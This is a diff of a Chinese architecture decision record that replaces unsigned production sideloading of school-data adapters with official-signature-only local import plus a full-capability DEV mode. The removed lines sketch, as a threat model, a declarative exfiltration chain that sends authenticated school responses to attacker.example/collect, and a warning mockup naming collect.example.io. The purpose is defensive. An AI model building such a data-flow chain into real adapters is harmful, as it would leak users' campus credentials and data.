@@ -1,214 +1,185 @@
-# ADR-033：生产侧载档（DEPLOY 下的声明式第三方 adapter）
+# ADR-033：双 profile 本地导入（DEPLOY official-only / DEV 全能力侧载）
 
-- **状态**：📋 提议（Proposed，AI 起草）。**未接受前不得合并任何实现代码。** 本文放宽的是红线 #4/#5 在 DEPLOY 下的侧载语义，属信任模型承重改动，按 [AGENTS.md](../../AGENTS.md) §1：**AI 不得独自闭环**，须人工主导评审 + 安全检查清单 + ≥1 人工审。
-- **日期**：2026-08-09
-- **适用范围**：**DEPLOY profile 下能否存在非 official adapter、其能力面、分发与告知义务**。**不含**：签名机制与 official 铸造（ADR-002 §2.3 / ADR-018）、凭证注入与脱敏实现（ADR-009/026/029）、DEV 侧载（ADR-002 §2.5 不变）、传输底座（红线 #4 第二句逐字不变）。
-- **触及红线**：#1（凭证永不离开核心）、#4（DEPLOY 包内无侧载入口）、#5（adapter 能力面）、#10（架构性改动先写 ADR）
-- **依赖**：
-  - [`ADR-002`](./adr_002_trust_model.md)（§2.1 两轴、§2.5 侧载闸门、§2.6 纵深防御——本文提议修订 §2.5/§2.6）
-  - [`ADR-010`](./adr_010_ios_appstore.md)（§2.1 DPLA §3.3.2 三段论——本文以 iOS 豁免保住 (b) 腿）
-  - [`ADR-022`](./adr_022_request_graph.md)（§2.3「sideload ⟹ 每个 capability declarative」的现行约束）
-  - [`ADR-023`](./adr_023_declarative_dataflow.md)（§2.5 污点三约束与分期、**§2.6 防扩散条款——本文是该条款的触发事件**）
-  - [`ADR-024`](./adr_024_build_profile_trust.md)（§2.2 profile 矩阵——本文提议加平台维度）
-  - [`ADR-028`](./adr_028_declarative_crypto_ops.md)（compute 词表含 md5/sha/aes，影响外泄链的表达力）
+- **状态**：已接受（Accepted）。2026-08-10 owner 明确：不得将初稿一次性拒绝后搁置；须保留决策过程，按本文新边界继续评审。**本文接受前，现有 DEPLOY 零侧载实现与 ADR-024 gate 仍是生效基线，不得先合并生产导入实现。**
+- **日期**：2026-08-09（2026-08-10 两轮反馈后重写）
+- **适用范围**：adapter bundle 的本地导入渠道、DEPLOY/DEV profile 的加载门禁、吊销新鲜度、设置入口与 `trustTier: sideload` / validator C3 的去留。
+- **不含**：transport 侧载（仍禁止）、签名密码学与私钥流程本身（ADR-002/018）、新 capability 或凭证契约（须另走 ADR）。
+- **触及红线**：#1（凭证永不离开核心）、#4（DEPLOY 加载入口）、#5（adapter 能力面）、#10（架构性改动先写 ADR）
+- **依赖**：ADR-002、ADR-010、ADR-018、ADR-022、ADR-023、ADR-024。
 
 ---
 
-## 1. 背景：一个已经存在的矛盾
+## 1. 决策过程
 
-本文**不是**新开一个口子，而是**消解仓库里一处既有矛盾**。
+### 1.1 初稿：DEPLOY 声明式未签名侧载
 
-红线 #5 逐字写着：
+2026-08-09 初稿提议：iOS 保持零侧载，Android/桌面允许未签名、declarative-only 的生产侧载，并增加 dataflow、域名与告知闸门。其动机是降低新学校 adapter 等待 official 审查和签名的供给瓶颈。
 
-> 能力面的硬约束不变：**release 下**第三方 / 侧载 adapter 的**每个 capability 必须是 declarative requestGraph**（无网络、无凭证、无副作用）。
+审查发现，`declarative` 已可通过 `bind` → `compute` → `inject` 控制跨请求数据流；仅凭“没有 `ctx.fetch`”不能证明未签名代码无法驱动敏感数据外送。初稿因此需要一套额外的生产低信任运行时，复杂度和证明负担过高。
 
-这句话的前提是「release 下侧载 adapter 存在，只是被限死为声明式」。而 ADR-002 §2.5 写的是：
+### 1.2 第一轮反馈：改为 DEPLOY 零侧载
 
-> **release 维持原约束不变**：release 下侧载入口**根本不存在**；任何非 official adapter 无加载路径。
+2026-08-10 第一轮反馈倾向彻底拒绝生产侧载，改为所有平台 `DEPLOY = 零侧载`、`DEV = 唯一侧载环境`。该方案能力面最小，但把“分发渠道”和“运行时信任档”捆在一起：即使 bundle 已有 official 签名、可通过吊销校验，也无法由用户从本地文件恢复、测试或安装。
 
-两者矛盾。而代码**分层地各实现了一边**：
+### 1.3 第二轮反馈：打回修改，不作一次性拒绝
 
-| 层 | 现状 | 站哪边 |
+owner 最终要求继续保留两种本地导入，但严格区分：
+
+- **DEV-Sideload 是开发工具**：侧载全部允许，不限制为 declarative；
+- **DEPLOY 本地导入是 official 的另一条输入渠道**：只接受通过 official 签名与远端吊销校验的 bundle，导入后信任档仍是 official；
+- DEPLOY 入口放在设置中的低频高级项，避免成为日常动线，低可达性只减误触，不承担安全边界。此路径安全边界由adapters签名承担。
+
+本文据此重写，回到 Proposed 待审状态。
+
+---
+
+## 2. 术语：渠道与信任档必须分开
+
+“侧载”容易同时指两件事，本文强制拆开：
+
+1. **本地导入渠道（local import）**：bundle 字节来自用户选择的本地文件，而非 catalog/CDN 自动下载；
+2. **运行时信任档（trust tier）**：核心根据验签结果裁定 bundle 能获得什么能力。
+
+因此：
+
+- DEPLOY 可以有本地导入渠道，但导入的 bundle 必须被裁定为 `official`；
+- `trustTier: sideload` 只表示 DEV 中未签名/非官方签名的开发素材；
+- “从本地文件导入”不等于“按 sideload trust tier 运行”；
+- manifest 自报 `official` 仍不能提权，权威档位只来自核心验签。
+
+---
+
+## 3. 提议决策
+
+### 3.1 profile 矩阵
+
+| profile | 本地导入 | 可接受 bundle | requestGraph / 能力 | 分发 |
+|---|---|---|---|---|
+| **DEPLOY** | 有，设置内高级项 | **official 验签 + 身份绑定 + 在线 catalog/revocation + 吊销/版本/stdlib/schema 全门禁** | 与 catalog 安装的 official 完全相同 | 正式用户产物 |
+| **DEV-Sideload** | 有，开发入口 | official 或未签名 DEV 素材 | **全部允许**：declarative、imperative 及当前宿主已编入的敏感能力 | 仅开发者，**不可分发** |
+
+两者都不新增 trust tier。DEPLOY 本地导入成功后铸造的是既有 `official` grant；DEV 未签名导入铸造的是既有 `devSideload` context。
+
+### 3.2 DEV-Sideload：全部允许
+
+DEV-Sideload 的职责是调试 adapter，而不是模拟低信任生产沙箱。因此：
+
+- 未签名 adapter 可混用 declarative / imperative requestGraph；
+- 不受sequence防回滚影响，不验证签名以及吊销列表。
+- 可调试登录、凭证收割、ssoMint、dataflow、action 等**当前 DEV 宿主已编入**的能力；
+- imperative 可通过 broker 使用开发者自有测试账号的凭证；凭证值本身仍不得离开核心（红线 #1 不因 DEV 失效）；
+- 强启动警告、独立 applicationId/bundle ID、每 adapter 首次全占用确认和“不可分发”标记继续保留；
+- DEV 可使用优化的 `--release` build；优化等级不决定信任 profile；
+- DEV 不是“declarative-only sideload”，所有此类表述均废止。
+
+#### C3 处置
+
+提议退役 `C3_sideload_must_declarative`：
+
+- 它会阻止 imperative adapter 作为 DEV/社区素材被完整预检，与 DEV-Sideload 的调试职责冲突；
+- official 签名流程应审查最终 bundle 的真实能力，而不是要求待签素材先伪装成 sideload declarative；
+- 签名 ceremony 输出的权威档位是 official，DEPLOY 能力由 official 签名、人工审查和运行时宿主门禁承担；
+- validator 仍须校验 requestGraph 结构、域名白名单、凭证引用、capability registry 与所有能力专属规则，但不再以 `trustTier: sideload` 一刀切禁止 imperative。
+
+这是 validator 行为修订，不删除 manifest 的 `trustTier: sideload` 枚举。落地前须补 C3 删除的正反例，并人工复核不存在把 manifest claim 当成权威档位的路径。
+
+### 3.3 DEPLOY：official-only 本地导入
+
+DEPLOY 设置页可让用户显式选择本地 bundle 文件。导入必须按以下顺序 fail-closed：
+
+1. **只接受显式文件选择**：无 deep link 自动导入、无文件关联自动执行、无任意 URL 下载框、无后台扫描目录；
+2. **解析上限与格式校验**：在验签前限制压缩包字节数、单文件与累计解压字节数、文件数和嵌套深度；拒绝绝对路径、`..`、重复路径、规范化后碰撞、链接及 envelope 允许集之外文件；再做 schema/version 检查。任一超限/畸形立即拒绝，解压不得无界落盘；
+3. **official 验签**：使用内置 active official pin 验证签名、digest、adapterId/version 与裁定档位；非 official、未签名、自报 official 或 dormant/未知 key 一律拒绝；
+4. **在线刷新远端治理材料**：从固定官方端点拉取 catalog 以及 revocation，验证签名、TTL 与 sequence 单调性；网络失败、签名失败、回滚、过期、同 sequence 不同字节（equivocation）或无法确认新鲜度时，本次导入失败，**不得仅凭本地 last-good 完成新导入**；
+5. **治理高水位独立提交**：一旦新 catalog/revocation 通过签名、TTL、sequence/equivocation 校验，须在检查候选 bundle 前分别原子持久化其原始签名字节与 sequence 高水位。即使候选随后因吊销/版本不符被拒，也不得丢弃已见的新治理状态；后续旧 sequence 永远拒绝。治理 last-good 与 adapter last-good 是两个事务，禁止共用“候选失败则全部回滚”的语义；
+6. **catalog 与降级门**：catalog 的权威字段是 adapterId/version/digest/stdlibMin/capabilities；revocation 的权威字段是 key kill-switch、撤销范围与 minVersion。若 catalog 有同 adapter 条目：候选版本不得低于 catalog 版本；同版本 digest 必须一致；候选 capabilities 不得与签名 manifest/registry 冲突。若 catalog 无该 adapter，可凭 official 签名继续，但仍受 revocation。候选版本还不得低于当前已安装版本或 revocation minVersion；本 ADR 不提供降级/回滚例外；
+7. **吊销与兼容门**：检查 key kill-switch、adapterId/version/digest 吊销、`stdlibMin`、schema 与 capability registry；任一不满足即拒绝；
+8. **原子安装**：候选校验全过后写临时区，持久化来源=`local-import`、bundle digest、验证时 catalog/revocation sequence，再原子切换 adapter last-good；候选失败不得污染已安装 adapter，但不得回滚第 5 步已提交的治理高水位；
+9. **每次启动仍走统一 loader**：本地导入只改变字节来源，不绕过既有验签、吊销和 stdlib 门。
+
+“远端吊销后才能侧载”在本文中具体解释为：**每次新增或更新本地导入都必须成功在线取得并验证新鲜治理材料**。已安装 bundle 的离线启动是否继续沿用 ADR-002 的 last-good/TTL 规则不在本次放宽范围内，仍按既有 loader 语义。
+
+### 3.4 设置入口与告知
+
+DEPLOY 入口位于：`设置 → 高级 → 本地导入官方 adapter`。要求：
+
+- 不放首页、adapter 缺失提示或登录主流程；
+- 不用系统文件关联、分享菜单或 deep link 暴露快捷入口；
+- 进入页先说明“仅接受 Elecon official 签名包；导入前必须联网检查吊销”；
+- 文件选择后展示 adapterId、version、签名 keyId、digest、声明域名和来源路径，再由用户确认；
+- 明确错误区分：未签名/非 official、签名失败、无法联网检查吊销、已吊销、版本/stdlib 不兼容。
+
+入口低可达性只是防误触和避免形成“插件市场”观感；真正安全边界始终是验签、在线治理材料、吊销与统一 loader。UI 隐藏绝不能替代机制校验。
+
+DEV 入口可更直接，但必须保留不可关闭的 DEV 身份提示与风险确认。
+
+### 3.5 分发与吊销语义
+
+- catalog/CDN 仍是默认安装与更新渠道；本地导入是显式备用渠道，不允许配置第三方 catalog；
+- 本地导入包不要求已出现在 catalog 中，因为 official 签名本身是发布授权；未收录时 catalog 仅提供已验签的新鲜治理高水位，候选仍受 revocation/kill-switch；
+- 本地导入不能固定旧版本或降级到低于当前安装/catalog/minVersion 的版本；同 adapter/version 若已在 catalog，digest 必须一致；
+- official 私钥仍不上服务器/CI，本地导入不改变签名 ceremony；
+- DEPLOY 不接受 community key、自签 key、用户自定义 CA/key 或“仅 declarative 所以放行”的例外。
+
+---
+
+## 4. 安全与合规分析
+
+### 4.1 相比初稿为何更安全
+
+初稿试图让未签名 declarative adapter 进入 DEPLOY，必须另造 G1-G6 能力子集。新方案不让任何未签名/非 official 代码进入 DEPLOY：本地文件与网络下载最终汇入同一 official loader，避免维护第二套生产能力模型。
+
+声明式 dataflow 的外泄分析仍保留为决策依据：它证明“declarative-only”不足以替代签名和审查，但不再需要为 DEPLOY 本地导入裁剪 dataflow，因为导入包已经是 official。
+
+### 4.2 新增风险
+
+1. **入口代码进入 DEPLOY**：ADR-024 原“侧载入口符号为零”不再成立，gate 必须改成证明“未签名/devSideload 铸造与凭证放行路径为零”，并测试 DEPLOY 本地导入只汇入 official verifier。
+2. **解析攻击面前移**：攻击者可喂任意本地文件，故格式/大小/路径校验须在昂贵解析和写盘前 fail-closed。
+3. **远端治理可用性**：导入时强制联网会牺牲离线安装，但避免用陈旧 last-good 接受已吊销包；本文选择安全优先。
+4. **App Store 解释成本**：iOS 也保留本地导入时，ADR-010 的“物理无侧载入口”论证必须改写为“无第三方代码市场：只接受项目 official 签名且受远端吊销治理”。接受本文前须人工复核 DPLA §3.3.2 论证。
+5. **误发 DEV 包**：DEV 允许全部能力，误发后果更重；独立应用身份、水印与 release gate 必须保留，DEPLOY gate 必须能拒绝 DEV profile。
+
+### 4.3 不变量
+
+- 凭证值与等价物仍不离开核心；
+- DEPLOY 永不运行未签名或非 official adapter；
+- manifest `trustTier` 仍只是 claim；
+- 本地导入不绕过签名、吊销、最低版本、stdlib 与 capability schema gate；
+- transport 仍无任何侧载入口；dev transport 仍仅 debug build 存在；
+- DEV 全能力例外不进入 DEPLOY 的未签名运行路径。
+
+---
+
+## 5. 连带修订与落地闸门
+
+本文接受后须同批完成：
+
+1. 修订 ADR-002 §2.5/§2.6：渠道与 trust tier 分离，DEV 全能力，DEPLOY local import official-only；
+2. 修订 ADR-022/001：退役 C3，保留 per-capability requestGraph 结构校验；
+3. 修订 ADR-024：从“DEPLOY 无入口”改为“DEPLOY 无 devSideload/未签名路径”，重做 gate 哨兵；
+4. 修订 ADR-010：重写 iOS 非代码市场论证并人工复核；
+5. 修订 ADR-018：新增本地文件这一 official bundle 字节来源，但不新增信任域或签名档；
+6. 为 Android、iOS、macOS、Windows、Linux、OHOS 补产物与入口测试；
+7. 安全实现与测试须人工主导 + 安全清单 + 至少一名人工审阅，AI 不得独自闭环。
+
+**接受前禁止实现**：当前代码仍应保持 ADR-024 的 DEPLOY 零侧载 gate；本文评审通过后，才可按上述连带清单修改实现与红线终稿。
+
+---
+
+## 6. 待审问题
+
+1. iOS 本地 official 导入是否足以维持 DPLA §3.3.2(b)“非代码市场”论证，是否需要平台例外？本文倾向全平台一致，但须人工合规复核。
+2. official 签名但尚未进入 catalog 的 bundle 是否允许导入；本文提议允许，但必须通过最新 revocation，且不得降级当前已安装版本。
+3. 本地导入文件格式是否直接复用 ADR-018 envelope，是否需要单文件封装；实现前须固定路径/大小上限。
+4. 新 gate 如何机械证明 DEPLOY 不含 `devSideload` grant 铸造与未签名执行路径，而不是只检查一个可绕过的哨兵字符串。
+
+---
+
+## 7. 修订记录
+
+| 日期 | 阶段 | 决策过程 |
 |---|---|---|
-| `contract/manifest.schema.json` | `trustTier` enum = `["official", "sideload"]` | 红线 #5 |
-| `tools/src/validator`（C3） | `sideload` ⟹ 每个 capability 必须 `declarative` | 红线 #5 |
-| `client/lib/core/loader/verify.dart:196` | 验签档位 `!= official` 一律拒 | ADR-002 §2.5 |
-
-即：**`sideload` 是一个已经铺好、validator 已在守、但运行时拒绝激活的休眠契约挂钩。** 本文提议激活它，并补齐激活所必需的约束。
-
-### 1.1 动机
-
-social：社区开发者只调 adapter、不改核心（ADR-024 §1 的同一批人）。他们写出的 adapter 要给同学试用，目前唯一路径是「等官方铸造」。official 铸造是人工审 + 硬件签名的重流程，**把它设为唯一路径等于把新学校/新数据源的供给侧卡死在 owner 一个人的带宽上**——这与 ADR-000「在最少人力下对学校接口变动保持韧性」的第一目标相悖。
-
----
-
-## 2. 决策（提议）
-
-### 2.1 DEPLOY 下允许**声明式**侧载 adapter，平台受限
-
-| profile × 平台 | 侧载入口 | 可跑 imperative | 判别机制 |
-|---|---|---|---|
-| **DEPLOY · iOS** | **编译期剔除（无任何侧载入口）** | 否 | 平台条件编译 |
-| **DEPLOY · Android / Windows / Linux / macOS** | **编入，仅接受 declarative** | **否**（imperative 路径仍编译期剔除） | 信任 profile + 平台条件编译 |
-| **DEV**（全平台） | 编入 | 是（ADR-002 §2.5 不变） | `ELECON_TRUST_PROFILE=dev-sideload` |
-
-> **macOS 归入桌面端**：ADR-010 的合规约束针对 **iOS App Store 提交产物**；macOS 若走 App Store 分发，须按 §2.6 同样豁免。**首个实现批次建议只做 Android + Windows + Linux**，macOS 待分发形态定了再开。
-
-**不新增第三个 profile。** ADR-024 §5.1「仅 DEPLOY + DEV」的终定结论**不推翻**——iOS 的零侧载是**平台维度**的条件编译，不是一个新的信任档。判别式为 `kSideloadEnabled ∧ ¬kIsIOS`（两者皆编译期常量，DEPLOY-iOS 下整段死代码剔除）。
-
-### 2.2 为什么「declarative」四个字本身不够（本文的核心发现）
-
-红线 #5 的括号「无网络、无凭证、**无副作用**」，是 `declarative == 纯解析宿主取回的响应` 那个时代的定义。**[ADR-023](./adr_023_declarative_dataflow.md) 把 declarative 扩宽到「多请求 + 跨请求数据流」之后，这句约束的实际强度已经改变**——只因 `sideload` 进不了生产，从未暴露。
-
-具体地，下述外泄链**完全落在 declarative 内、零点击、adapter 全程不调 `ctx.fetch` 也不看句柄值**：
-
-```
-requests[a]  → 学校端点          （broker 按 credentials.scope 注入登录态）
-  bind    { var: v, from: "a", extract: ... }        ← 从已认证响应取值
-  compute { ... }                                    ← 可选变换（ADR-028 含 md5/sha256/aes-cbc）
-  inject  { var: v, into: "b", at: "url", name: "d" } ← 追加 query 参数
-requests[b]  → https://attacker.example/collect?d=<被窃数据>   ← **broker 亲自发出**
-```
-
-成立所依赖的事实（均已查证）：
-
-- `network.allow` **完全由 manifest 自声明**，无任何外部 host 约束；
-- `inject.at` 枚举含 `"url"`，语义即「追加 query 参数」；`inject.into` 可为本 capability 任意 `requests[].key`；
-- `tools/src/validator` 中按 `trustTier` 设的闸门**只有两处**：C3（sideload ⟹ declarative）与 ssoMint 的 official-only。**`bind`/`compute`/`inject` 不按信任档设闸。**
-
-ADR-023 §2.5 开篇已经点明这个道理：
-
-> **「adapter 看不到值」是必要不充分**——adapter 控制数据流程序，若能对秘密值运算并观测到依赖结果的效果，就能一位位套出值（预言机 / 侧信道），全程不看内容。
-
-### 2.3 ADR-023 已写明：这一威胁当前**只**由「人工审 + 签名」兜着
-
-三处原文连起来即为结论：
-
-- §2.5 分期：「MVP 先不上污点标记 + 禁分支/禁回读的自动围栏；此期**替代闸门 = official 人工审**」
-- §2.5 Threat scoping：「恶意 official 作者 + 自控某白名单端点、读其日志」**不属本安全模型**……归 **official = 人工审 + 签名** 兜，非污点职责」
-- §2.6 🔒 防扩散条款：「本决策**只绑定「`devSideload` 结构上仅存在于 DEV 构建」这一事实**……若将来新增任何**在生产环境中可存在的**第三方 / 非 official 档，它**不自动继承**本决策，必须就 dataflow 能力面重新裁定」
-
-**本 ADR 就是 §2.6 防扩散条款的触发事件。** 生产侧载档拆掉的，恰好是 ADR-023 唯一依赖的那道闸门。故 §2.4 的能力面裁定**不可省略**，且必须是**闸门**而非告知。
-
-### 2.4 生产侧载档的能力面（闸门，非告知）
-
-`trustTier: sideload` 在 DEPLOY 下：
-
-| # | 约束 | 依据 |
-|---|---|---|
-| **G1** | 每个 capability `requestGraph` 必须 `declarative`（现行 C3，提升为**运行时**亦强制，不止分发路径） | 红线 #5、ADR-022 §2.3 |
-| **G2** | **禁 `bind` / `compute` / `inject`**——生产侧载 capability 退回「宿主按 `requests[]` 代取 → adapter 纯解析 → 出 emits」 | §2.2/§2.3；ADR-023 §2.6 重裁 |
-| **G3** | `network.allow` 与 `requests[].url` 的 host **须落在该学校的官方域集合内**；集合来自内置学校目录（将来随签名 catalog 下发），**不接受 manifest 自声明域** | §2.2 第一条事实 |
-| **G4** | 不得声明 `login`、`ssoMint`、`credentials[].role: sso-master` | 红线 #1；ADR-017 |
-| **G5** | 不得引入 `contract/capability/registry.json` 之外的 capability id | ADR-010 §2.1(a)、ADR-018 §2.5 |
-| **G6** | 输出仍过核心边界 schema gate（P0-08）与 ADR-026 delivery firewall | 红线 #6 |
-
-**G2 与 G3 的分工**：G2 断掉「把 A 的数据搬到 B」的数据通道；G3 断掉「B 是攻击者可控 host」这个前提。两者**独立成立、互为兜底**——只做 G2，adapter 仍可用 `requests[]` 的发生与否做信标（泄露「用了没用」，不泄内容）；只做 G3，若某官方域下有可控的日志端点，G2 缺席时数据仍可外传。故**两条都要**。
-
-> **G2 的代价与再评估条件**：禁 dataflow 意味着需要跨请求依赖的数据源（挑战应答、动态分页）**无法以侧载形态提供**，只能走 official。这是刻意的——那类请求图正是 ADR-023 §2.5 判定「须人工审」的形态。**再评估触发点 = ADR-023 §2.5 的污点自动围栏落地**；届时可就 G2 单独重裁，不必重开本 ADR。
-
-### 2.5 告知义务（三级警告，是义务不是闸门）
-
-§2.4 是闸门；本节是**在闸门之上**对残余风险的告知。owner 2026-08-09 立场：**侧载须用户手动下载并在应用内显式指定，尽到告知义务后，剩余选择属用户自由。**
-
-**级别一 · 未签名 + 不可吊销**：明确告知该 adapter 未经审查、**且一旦加载无法被远程吊销**（§3 风险 1）。
-
-**级别二 · 域对照**：列出该 adapter 会访问的全部 host，**判据是「是否属于本校官方域集合」，不是 TLD 后缀**。
-
-> 🔒 **刻意不用 `edu.cn` 作判据。** 两个理由：① 学校自身的域**必然**在 allow 内，落在校内可控/失陷主机上的外泄端点会**显示为绿色**——而这正是 ADR-023 §2.5 Threat scoping 点名的场景；② `.edu.cn` 可注册、可失陷，「TLD 后缀」不是「这是不是这所学校」。用 TLD 作判据会**在最危险的形态上给绿灯、在无害的第三方 CDN 上标红**，信号方向是反的。
-
-**级别三 · 数据流结论**：不只列域名，**把外泄形态算出来用一句话说清**。
-
-manifest 的相关字段全部静态声明，无需运行即可判定（已查证）：
-
-```
-requests[] : key, url, credential           ← 哪条请求带登录态、发往哪
-bind[]     : var, from(= requests[].key)    ← 值来自哪条响应
-inject[]   : var, into(= requests[].key), at, name   ← 注入到哪条请求
-```
-
-判定算法：对每个 `inject`，把 `inject.var` 经 `compute` 链回溯到其 `bind`，取 `bind.from` 源请求的 host 与 `credential` 有无，与 `inject.into` 目标请求的 host 比对。**源带凭证 ∧ 目标异 host ⟹ 外泄形态。** 此图遍历与 validator 现有 D12/D15（依赖图/无环）同一套，复用即可。
-
-> **本 ADR 下 G2 已禁 dataflow，故级别三在生产侧载上恒不触发。** 保留它有两个理由：① 它是 DEV 侧载（ADR-002 §2.5，dataflow 仍开放）的告知手段；② G2 若因 §2.4 的再评估条件解禁，级别三就是解禁的前置。
-
-参考形态（UI 细节不入契约）：
-
-```
-⚠ 未签名 adapter · 无法吊销
-
-此 adapter 会用你的「西安电子科技大学」登录态访问：
-  ✓ ehall.xidian.edu.cn
-  ✓ jwc.xidian.edu.cn
-并将上述响应中的内容发送到：
-  ⛔ collect.example.io        ← 非本校官方域
-你的校园统一认证同时用于邮箱 / 图书馆 / 一卡通。
-
-[ 取消 ]                    [ 我理解风险，仍要加载 ]
-```
-
-**SSO 连带面必须写进文案**：用户同意的是「一个 adapter」，暴露的是「统一认证能开的全部」。这个不对称他应当知道。
-
-**每 `adapterId` 首次确认**（沿用 ADR-002 §2.5 的 dev 侧载形态），不设「不再提示」。
-
-### 2.6 ADR-010（App Store）：以 iOS 豁免保住 (b) 腿
-
-ADR-010 §2.1 的 DPLA §3.3.2 三段论中，**(b)「非代码市场」建立在「release 无侧载入口」上**。§2.1 的平台矩阵使这条腿**对提交给 App Store 的产物逐字仍然成立**——DEPLOY-iOS 无任何侧载入口。
-
-需要的修订因此从「重写合规论证」降级为「把断言标注为平台限定」：
-
-- §2.3 / §5 的「构建期断言：iOS release build 无侧载 / 未签名 adapter 加载路径」→ 明确为 **iOS 专属断言**，并接入 ADR-024 的 release gate（见 §4）。
-- §2.4 对审核员的三句话中「无侧载入口 → 非代码市场」保留，但在内部文档注明**该句仅对 iOS 产物成立**，不得用于描述 Android/桌面产物。
-- (a)「固定能力集」由 G5 承接；(c)「QuickJS 无 JIT」不受影响。
-
----
-
-## 3. 已知约束与残余风险
-
-1. **🔒 侧载 adapter 不可吊销（owner 明示接受，2026-08-09）。** 无签名即无 keyId、不进 revocation list，一旦用户本机加载，**没有远程召回手段**。缓解**只能**靠把能力面压到「即使永久留存也不致命」——这正是 §2.4 G1–G6 不可退让的理由。**本残余风险须逐字写进级别一警告。**
-2. **告知不是闸门。** §2.5 三级警告降低的是「用户不知情」，不降低「用户知情后仍被坑」的技术可能性。警告疲劳是已知的、无法用更多文案解决的问题。
-3. **G3 依赖学校官方域集合的质量。** 该集合目前来自内置目录（随 app 发版），非签名下发。集合过宽 = G3 变弱；集合过窄 = 合法 adapter 被误拒。签名 catalog 下发（ADR-018 §2.5）落地后应迁移。
-4. **信标面**（G2 之后的残余）：侧载 adapter 仍可通过「是否发起某条 `requests[]`」泄露极低带宽的信息。因 G3 限定 host 在本校域内，接收方须是校内可控主机，与 ADR-023 §2.5 Threat scoping 出范围的那类相同。**接受。**
-5. **平台不对称是长期负担。** 同一份 adapter 在 iOS 不可用、在桌面可用，会产生用户困惑与文档负担。这是 ADR-010 合规约束的必然代价。
-
----
-
-## 4. 连带修订清单（本 ADR 接受后逐项执行）
-
-| 目标 | 改什么 | 谁执行 |
-|---|---|---|
-| **AGENTS.md 红线 #4** | 「DEPLOY 包内无侧载入口」→「DEPLOY 包内无 **imperative** 侧载入口；**iOS 产物无任何侧载入口**」。第二句「dev 传输只在 debug build 存在」**逐字保留** | 🔒 **owner 人工落地**（红线原文） |
-| **AGENTS.md 红线 #5** | 澄清括号「无网络、无凭证、无副作用」的当代含义：`declarative` 经 ADR-023 扩宽后已含跨请求数据流，故对**生产**侧载须叠加本文 G2/G3 才回到该括号的原意 | 🔒 **owner 人工落地**（红线原文） |
-| **ADR-002** | §2.5 增「生产侧载档」一节（DEV 语义不变）；§2.1「release 维持 `sideload ⊆ official`」限定为 imperative；§2.6 防御表增运行时档位×能力面一行 | 随本 ADR 接受 |
-| **ADR-010** | §2.3/§5 断言标平台限定；§2.4 话术加内部注（见 §2.6） | 随本 ADR 接受 |
-| **ADR-022** | §2.3「sideload ⟹ declarative」补注：该约束在生产档下**不足以**独立成立，须叠加 G2/G3 | 随本 ADR 接受 |
-| **ADR-023** | §2.6 按防扩散条款重裁：生产侧载档**不继承** official 的 dataflow 能力面（= G2）；§2.5 注明「替代闸门 = official 人工审」不覆盖生产侧载 | 随本 ADR 接受 |
-| **ADR-024** | §2.2 矩阵加平台维度；§5.1 保留「仅两 profile」结论并注明 iOS 豁免走平台条件编译；§2.3 护栏 4 的符号断言语义调整（见下） | 随本 ADR 接受 |
-| **ADR-001 §5.2** | C3 的适用范围由「分发/签名路径」扩到运行时 | 随本 ADR 接受 |
-| **ADR-018** | 生产侧载包不经四信任域的 D（本地文件导入），须写明它**不在** catalog/revocation 治理内 | 随本 ADR 接受 |
-
-### 4.1 对已落地 release gate 的影响（🔒 会变弱，须知情）
-
-ADR-024 §2.3 护栏 4a 现以「DEPLOY 产物内侧载入口哨兵出现 0 次」作**结构性**断言（2026-08-07 已落地并实测）。本 ADR 接受后：
-
-- **DEPLOY-iOS**：断言**不变**，仍是最强的 0 次符号断言。
-- **DEPLOY-Android/桌面**：侧载加载路径**必须存在于产物中**，0 次断言不再适用。须改为断言 **imperative 侧载路径**的哨兵为 0 次——即哨兵要从「侧载入口」下移到「侧载-imperative 凭证注入分支」，并为 G1/G2 的运行时闸门补独立的负例测试。
-
-**这是一次实打实的强度下降**，须在安全签收时明示。2026-08-07 的实测已证明护栏 4b（元数据标记）会被 gradle 构建缓存击穿、当时全靠 4a 兜住；4a 在桌面/Android 变弱后，G1/G2 的**运行时**闸门测试就是新的最后一道，不可省。
-
----
-
-## 5. 开放问题（须 owner 勾决后方可实现）
-
-1. **G2 是否采纳？** 本文建议禁 dataflow。若 owner 认为代价过大，替代方案是「G3 单独承担 + 级别三警告」——但那把「数据能否搬出去」从闸门降级为告知，与 §2.3 的结论冲突，**本文不建议**。
-2. **G3 的域集合从哪来？** 短期用内置学校目录；是否要求随签名 catalog 下发（ADR-018 §2.5）作为接受本 ADR 的前置？
-3. **侧载包的导入形态**：单文件 bundle（复用 ADR-018 的 envelope 格式但无签名段）还是目录？是否要求 manifest digest 显示给用户以便社区互相核对？
-4. **macOS 归属**：走 App Store 则须同 iOS 豁免；若只做 DMG 直分发则归桌面端。取决于分发形态决策。
-5. **首批平台范围**：建议 Android + Windows + Linux，macOS 待 4 决定。
-
----
-
-## 6. 修订记录
-
-| 日期 | 内容 |
-|---|---|
-| 2026-08-09 | 初版（AI 起草，Proposed）。起因：owner 倾向「DEPLOY = declarative-only 侧载」而非「DEPLOY 零侧载」。查实外泄面后确认 declarative 四字本身不足，补 §2.4 能力面闸门；owner 同期勾定 iOS 条件编译豁免、桌面/Android 保留侧载、侧载不可吊销属明示接受、告知义务三级形态与「域对照不用 edu.cn 判据」。 |
+| 2026-08-09 | 初稿 Proposed | Android/桌面允许未签名 declarative-only 生产侧载，iOS 零侧载；因 dataflow 外泄面增 G1-G6。 |
+| 2026-08-10 | 第一轮反馈 | 倾向拒绝初稿并改为全平台 DEPLOY 零侧载；识别到该方案把渠道与信任档捆绑。 |
+| 2026-08-10 | 第二轮反馈 | 不作一次性拒绝，打回重写后待审：DEV-Sideload 全能力；DEPLOY 保留设置内本地导入，但只接受 official 签名且每次导入强制在线吊销治理。 |
+| 2026-08-10 | 正式同意 | 修改验证签名等表述，检验物料等修正 |
